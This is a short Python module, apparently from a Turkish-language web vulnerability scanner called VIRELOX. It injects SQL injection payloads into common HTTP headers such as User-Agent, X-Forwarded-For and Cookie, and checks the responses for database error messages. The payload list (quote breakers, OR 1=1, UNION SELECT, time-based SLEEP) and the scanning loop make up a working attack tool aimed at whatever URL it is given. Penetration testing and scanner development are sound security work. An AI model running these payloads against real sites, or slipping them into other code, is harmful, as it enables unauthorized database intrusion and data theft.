"""
VIRELOX Header Injection Modülü v4.0
Mozilla Public License 2.0 — AltayHR Developers
"""

import re
import time
from typing import List, Dict, Callable, Optional

HEDEFLER_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
    "X-Originating-IP", "X-Remote-Addr", "X-Client-IP",
    "Accept-Language", "Accept-Encoding", "Cookie",
    "X-Custom-IP-Authorization", "CF-Connecting-IP",
]

HATA_PAYLOADLARI = [
    "'", "\"", "`", "' OR '1'='1",
    "1 AND 1=1-- -", "' OR 1=1#",
    "1 UNION SELECT 1,2,3-- -",
    "' AND SLEEP(3)-- -",
]


class HeaderInjectionMotoru:
    def __init__(self, http, log=None, plog=None):
        self.http = http
        self.log  = log  or (lambda m: None)
        self.plog = plog or log or (lambda m: None)

    def tam_tara(self, url: str, post_data=None) -> List[Dict]:
        bulgular = []
        for header in HEDEFLER_HEADERS:
            for payload in HATA_PAYLOADLARI[:4]:
                try:
                    hdrs = {header: payload}
                    r = self.http.get(url, headers=hdrs)
                    if not r:
                        continue
                    icerik = getattr(r, 'text', '')
                    # Hata deseni kontrolü
                    if re.search(
                        r'(sql syntax|mysql|sqlite|postgresql|ora-\d|sql error)',
                        icerik, re.IGNORECASE
                    ):
                        bulgular.append({
                            "header":  header,
                            "payload": payload,
                            "teknik":  "error_based",
                        })
                        self.log(f"[HEADER] ✔ {header}: {payload[:40]}")
                        break
                except Exception:
                    continue
        return bulgular
